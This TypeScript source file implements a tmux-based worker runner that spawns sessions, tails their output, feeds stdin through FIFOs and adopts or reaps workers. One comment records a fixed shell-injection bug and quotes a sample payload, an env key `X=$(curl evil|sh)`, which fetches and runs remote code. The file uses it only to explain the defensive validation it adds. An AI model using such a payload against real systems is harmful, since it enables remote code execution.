import { spawn } from "node:child_process";
import { createHash } from "node:crypto";
import { open, readFile, stat, mkdir, rm, writeFile } from "node:fs/promises";
import { watch } from "node:fs";
import { join, resolve } from "node:path";
import type { WorkerProcess, WorkerRunner, WorkerInfo, WorkerSpec } from "@uacc/contracts";

export const TMUX_PREFIX = "uacc-";

/**
 * BUG (found by an independent red-team review, 2026-09-18, T4.10): the
 * shell command line `spawn()` builds interpolates every `spec.env` KEY
 * unescaped and unvalidated — only VALUES were quoted. `spec.env` is
 * client-reachable (`SessionSpec.env` in `CreateSessionBody`, forwarded
 * unchanged by every adapter that spawns a worker), so an env key like
 * `` X=$(curl evil|sh) `` produced a real shell command-substitution RCE
 * when the resulting `env <keys...> <cmd>; echo ...` string reached
 * `tmux respawn-pane` (which runs it via the pane's shell) — reproduced
 * live: the exact string-building logic below, run through `sh -c`,
 * executed the injected command. POSIX only allows `[A-Za-z_][A-Za-z0-9_]*`
 * as a variable name; anything else is refused outright rather than
 * "sanitized" (a name containing `=` or `$(...)` has no safe rewritten
 * form that preserves intent — the caller's env object is simply wrong).
 */
const SAFE_ENV_KEY = /^[A-Za-z_][A-Za-z0-9_]*$/;

function shellQuote(value: string): string {
  // Single-quote the whole value, escaping embedded single quotes the
  // standard POSIX way ('\'') — properly escapes instead of the previous
  // `replaceAll("'", "")`, which silently deleted embedded quotes instead
  // of preserving them (found alongside the injection above; same file,
  // same line, worth fixing together rather than leaving unsound
  // value-quoting next to a freshly-fixed key-quoting bug).
  return `'${value.replaceAll("'", `'\\''`)}'`;
}

function execTmux(args: string[], opts: { cwd?: string } = {}): Promise<{ code: number; stdout: string; stderr: string }> {
  return new Promise((resolve, reject) => {
    const proc = spawn("tmux", args, { cwd: opts.cwd, stdio: ["ignore", "pipe", "pipe"] });
    let stdout = "";
    let stderr = "";
    proc.stdout.on("data", (d: Buffer) => (stdout += d.toString()));
    proc.stderr.on("data", (d: Buffer) => (stderr += d.toString()));
    proc.on("error", reject);
    proc.on("close", (code) => resolve({ code: code ?? -1, stdout, stderr }));
  });
}

/** T7.2: the FIFO a pipe-mode worker reads its stdin from. */
function stdinPath(logPath: string): string {
  return `${logPath}.in`;
}

/** Writes in order into the worker's stdin FIFO. The pane keeps a reader
 * open, so opening for write never blocks. The handle must be closed when
 * the worker ends — Node 26 treats a handle left to GC as an error. */
function pipeWriter(fifo: string): { write: (data: string) => void; close: () => void } {
  const handle = open(fifo, "w");
  let chain: Promise<unknown> = handle;
  let closed = false;
  return {
    write: (data) => {
      if (closed) return;
      chain = chain.then(() => handle).then((fh) => fh.write(data)).catch(() => undefined);
    },
    close: () => {
      if (closed) return;
      closed = true;
      chain = chain.then(() => handle).then((fh) => fh.close()).catch(() => undefined);
    },
  };
}

function offsetPath(logPath: string): string {
  return `${logPath}.offset`;
}

/** Tail a file line by line; used to stream pane output captured via pipe-pane. */
class FileTailer {
  private offset = 0;
  private watcher?: ReturnType<typeof watch>;
  private closed = false;
  private pumping = false;
  private buffer = "";
  private readonly listeners = new Set<(line: string) => void>();
  private pollTimer?: NodeJS.Timeout;

  private readonly path: string;
  private readonly startOffset: number;

  /** `startOffset` > 0 resumes an adopted worker (T5.6) where the previous
   * hub stopped delivering lines. */
  constructor(path: string, startOffset = 0) {
    this.path = path;
    this.startOffset = startOffset;
  }

  onLine(cb: (line: string) => void): void {
    this.listeners.add(cb);
  }

  async start(): Promise<void> {
    // Always read from byte 0. Seeking to EOF (the previous behaviour)
    // dropped every line a short command had already written — the env
    // pass-through test (`echo $GREETING`) finished before start() ran
    // and then waited 600 ms on an empty buffer (found while P4.5 ran
    // the existing suite; same class of race P12 T12.2 called "tmux
    // unreliability").
    this.offset = this.startOffset;
    this.watcher = watch(this.path, { persistent: false }, () => void this.pump());
    this.pollTimer = setInterval(() => void this.pump(), 250);
    this.pollTimer.unref();
    await this.pump();
  }

  private async pump(): Promise<void> {
    if (this.closed || this.pumping) return;
    this.pumping = true;
    try {
      const st = await stat(this.path);
      if (st.size > this.offset) {
        const fh = await open(this.path, "r");
        try {
          const len = st.size - this.offset;
          const buf = Buffer.alloc(len);
          await fh.read(buf, 0, len, this.offset);
          this.offset += len;
          this.buffer += buf.toString("utf8");
          const lines = this.buffer.split("\n");
          this.buffer = lines.pop() ?? "";
          for (const line of lines) {
            for (const cb of this.listeners) cb(line);
          }
          // T5.6: bytes of complete, delivered lines — where an adopting
          // hub continues after a crash.
          if (lines.length > 0) {
            await writeFile(offsetPath(this.path), String(this.offset - Buffer.byteLength(this.buffer, "utf8")));
          }
        } finally {
          await fh.close();
        }
      }
    } catch {
      // file rotated/removed — stop quietly
    } finally {
      this.pumping = false;
    }
  }

  stop(): void {
    this.closed = true;
    this.watcher?.close();
    if (this.pollTimer) clearInterval(this.pollTimer);
  }
}

/**
 * tmux-backed WorkerRunner (ADR-P0-3): workers survive daemon restarts and
 * are attachable for emergency debugging (`tmux attach -t uacc-<session>`).
 * Pane output is captured via pipe-pane into a log file the WorkerProcess tails.
 */
export class TmuxRunner implements WorkerRunner {
  readonly kind = "tmux";

  private readonly logDir: string;
  /** BUG-0019: every hub shares the user's default tmux server. A worker
   * carries its owner as the session option `@uacc_owner`; list() and
   * reapOrphans() only see the workers of this runner, so a second hub
   * (tests, E2E, another data dir) never kills a live worker it does not
   * own. Workers without the option are foreign too. */
  readonly owner: string;

  constructor(logDir: string, owner?: string) {
    this.logDir = logDir;
    this.owner = owner ?? createHash("sha256").update(resolve(logDir)).digest("hex").slice(0, 16);
  }

  private fullName(name: string): string {
    return name.startsWith(TMUX_PREFIX) ? name : `${TMUX_PREFIX}${name}`;
  }

  async isAvailable(): Promise<boolean> {
    const res = await execTmux(["-V"]).catch(() => null);
    return res !== null && res.code === 0;
  }

  async spawn(spec: WorkerSpec): Promise<WorkerProcess> {
    // Validated FIRST, before any I/O: a rejected env key must never reach
    // tmux, and reachability shouldn't depend on tmux being installed.
    for (const key of Object.keys(spec.env ?? {})) {
      if (!SAFE_ENV_KEY.test(key)) {
        throw new Error(`TmuxRunner: invalid environment variable name "${key}" — refusing to spawn (shell-injection guard)`);
      }
    }

    await mkdir(this.logDir, { recursive: true });
    const full = this.fullName(spec.name ?? "session");
    const logPath = join(this.logDir, `${full}.log`);

    // Clean any stale session/log from a previous run with the same name.
    await execTmux(["kill-session", "-t", full]).catch(() => undefined);
    await rm(logPath, { force: true });
    await rm(offsetPath(logPath), { force: true });
    await rm(stdinPath(logPath), { force: true });

    const cmdLine = spec.cmd
      .map((a) => (/^[\w./=@%^+:-]+$/.test(a) ? a : shellQuote(a)))
      .join(" ");
    const envPrefix = Object.entries(spec.env ?? {})
      .map(([k, v]) => `${k}=${shellQuote(v)}`)
      .join(" ");
    let shellCmd = `env ${envPrefix} ${cmdLine}; echo "__UACC_EXIT__$?"`;
    if (spec.stdin === "pipe") {
      // T7.2: stdin from a FIFO the pane itself holds open read-write (fd 3):
      // writers (this hub, the next one after a restart) come and go without
      // the worker ever seeing EOF, and nothing is echoed or cut at the
      // terminal's 4 KB line limit. POSIX sh, whatever the user's shell is.
      const fifo = stdinPath(logPath);
      const res = await new Promise<number>((done) => spawn("mkfifo", ["-m", "600", fifo]).on("exit", (code) => done(code ?? 1)));
      if (res !== 0) throw new Error(`tmux spawn failed: mkfifo ${fifo}`);
      shellCmd = `sh -c ${shellQuote(`exec 3<>${shellQuote(fifo)}; env ${envPrefix} ${cmdLine} <&3; echo "__UACC_EXIT__$?"`)}`;
    }

    // 1. Create the session with a placeholder — so options can be applied
    //    BEFORE the real command runs (no remain-on-exit race for short cmds).
    const res = await execTmux([
      "new-session",
      "-d",
      "-s",
      full,
      "-c",
      spec.cwd,
      "-x",
      String(spec.cols ?? 220),
      "-y",
      String(spec.rows ?? 50),
      "sleep 300",
    ]);
    if (res.code !== 0) {
      throw new Error(`tmux spawn failed: ${res.stderr.trim()}`);
    }
    try {
      await execTmux(["set-option", "-t", full, "@uacc_owner", this.owner]);
      // BUG-0034: where this worker's logs live — a prune recognizes an
      // orphan in the default server by its log dir being gone.
      await execTmux(["set-option", "-t", full, "@uacc_logdir", this.logDir]);
      // 2. Keep the pane after exit so pipe-pane can flush the tail reliably.
      await execTmux(["set-option", "-t", full, "remain-on-exit", "on"]);
      // 3. Capture pane output (stdout+stderr interleaved) into the log file.
      await execTmux(["pipe-pane", "-t", full, "-o", `cat >> ${logPath}`]);
      // 4. Swap the placeholder for the real command.
      await execTmux(["respawn-pane", "-k", "-t", full, "-c", spec.cwd, shellCmd]);
    } catch (err) {
      await execTmux(["kill-session", "-t", full]).catch(() => undefined);
      throw err;
    }

    return this.track(full, logPath, 0, spec.stdin === "pipe");
  }

  /**
   * T5.6 / ADR-0014: take over a worker this runner owns that survived a hub
   * restart. Output continues after the last line the previous hub
   * delivered. Null when there is no such worker.
   */
  async adopt(name: string): Promise<WorkerProcess | null> {
    const full = this.fullName(name);
    if (!(await this.list()).some((worker) => worker.fullName === full)) return null;
    const logPath = join(this.logDir, `${full}.log`);
    const saved = Number(await readFile(offsetPath(logPath), "utf8").catch(() => "0"));
    const piped = await stat(stdinPath(logPath)).then(
      (s) => s.isFIFO(),
      () => false,
    );
    return this.track(full, logPath, Number.isFinite(saved) && saved > 0 ? saved : 0, piped);
  }

  private async track(full: string, logPath: string, startOffset: number, piped = false): Promise<WorkerProcess> {
    const pipe = piped ? pipeWriter(stdinPath(logPath)) : null;
    const pid = await this.panePid(full);
    const tailer = new FileTailer(logPath, startOffset);
    let exited = false;
    let exitCode: number | null = null;
    const exitCbs = new Set<(code: number | null) => void>();
    const exitPromise = new Promise<{ code: number | null }>((resolve) => {
      exitCbs.add((code) => resolve({ code }));
    });
    const stdoutCbs = new Set<(chunk: string) => void>();
    const stdoutReplay: string[] = [];

    tailer.onLine((line) => {
      if (line.includes("__UACC_EXIT__")) return;
      const chunk = `${line}\n`;
      if (stdoutCbs.size === 0) stdoutReplay.push(chunk);
      else for (const cb of stdoutCbs) cb(chunk);
    });
    await tailer.start();

    const checkExit = setInterval(async () => {
      if (exited) return;
      const dead = await this.paneDead(full);
      if (!dead) return;
      exited = true;
      clearInterval(checkExit);
      // pipe-pane flushes asynchronously — retry briefly until the marker lands.
      for (let i = 0; i < 8; i++) {
        try {
          const content = await readFile(logPath, "utf8");
          const m = content.match(/__UACC_EXIT__(\d+)/);
          if (m) {
            exitCode = Number(m[1]);
            break;
          }
        } catch {
          // log not readable (yet)
        }
        await new Promise((r) => setTimeout(r, 150));
      }
      tailer.stop();
      pipe?.close();
      for (const cb of exitCbs) cb(exitCode);
      // Clean up the remained pane — the log file keeps the evidence.
      await execTmux(["kill-session", "-t", full]).catch(() => undefined);
    }, 200);

    return {
      ...(pid !== undefined ? { pid } : {}),
      attachCmd: `tmux attach -t ${full}`,
      onStdout: (cb) => {
        stdoutCbs.add(cb);
        for (const chunk of stdoutReplay) cb(chunk);
        stdoutReplay.length = 0;
      },
      onStderr: (_cb) => {
        // stdout/stderr are interleaved in the pane capture
      },
      onExit: (cb) => exitCbs.add(cb),
      write: pipe ? pipe.write : (data) => void execTmux(["send-keys", "-t", full, "-l", data]),
      kill: async (signal) => {
        if (signal === "SIGKILL") await execTmux(["kill-session", "-t", full]);
        else {
          await execTmux(["send-key", "-t", full, "C-c"]).catch(() => undefined);
          await new Promise((r) => setTimeout(r, 100));
        }
      },
      exited: () => exitPromise,
    };
  }

  private async panePid(full: string): Promise<number | undefined> {
    const res = await execTmux(["display-message", "-p", "-t", full, "#{pane_pid}"]);
    const pid = Number(res.stdout.trim());
    return Number.isFinite(pid) && pid > 0 ? pid : undefined;
  }

  private async paneDead(full: string): Promise<boolean> {
    // BUG-0025: with other sessions on the server, tmux 3.7 answers
    // display-message for a missing target with exit 0 and no output — ask
    // for the exact session first ("=" disables prefix matching).
    const exists = await execTmux(["has-session", "-t", `=${full}`]).catch(() => null);
    if (!exists || exists.code !== 0) return true; // session gone entirely
    const res = await execTmux(["display-message", "-p", "-t", full, "#{pane_dead}"]).catch(
      () => null,
    );
    if (!res) return true; // tmux itself failed to run
    if (res.code !== 0) return true;
    const state = res.stdout.trim();
    return state === "" || state === "1";
  }

  async list(): Promise<WorkerInfo[]> {
    const res = await execTmux([
      "list-sessions",
      "-F",
      "#{session_name}\t#{pane_pid}\t#{session_created}\t#{@uacc_owner}",
    ]).catch(() => null);
    if (!res || res.code !== 0) return [];
    return res.stdout
      .trim()
      .split("\n")
      .map((l) => l.split("\t"))
      .filter(([name, , , owner]) => name?.startsWith(TMUX_PREFIX) && owner === this.owner)
      .map(([name, pid, created]) => {
        const pidNum = pid ? Number(pid) : NaN;
        const createdNum = created ? Number(created) * 1000 : NaN;
        return {
          name: name!.slice(TMUX_PREFIX.length),
          fullName: name!,
          ...(Number.isFinite(pidNum) ? { pid: pidNum } : {}),
          ...(Number.isFinite(createdNum) ? { createdAt: createdNum } : {}),
        };
      });
  }

  async killByName(fullName: string, signal?: "SIGTERM" | "SIGKILL"): Promise<void> {
    const full = this.fullName(fullName);
    if (signal !== "SIGKILL") {
      await execTmux(["send-key", "-t", full, "C-c"]).catch(() => undefined);
      await new Promise((r) => setTimeout(r, 100));
    }
    await execTmux(["kill-session", "-t", full]).catch(() => undefined);
  }

  async reapOrphans(keep: readonly string[]): Promise<string[]> {
    const keepSet = new Set(keep.map((k) => this.fullName(k)));
    const workers = await this.list();
    const reaped: string[] = [];
    for (const w of workers) {
      if (keepSet.has(w.fullName)) continue;
      await this.killByName(w.fullName, "SIGKILL").catch(() => undefined);
      reaped.push(w.fullName);
    }
    return reaped;
  }
}
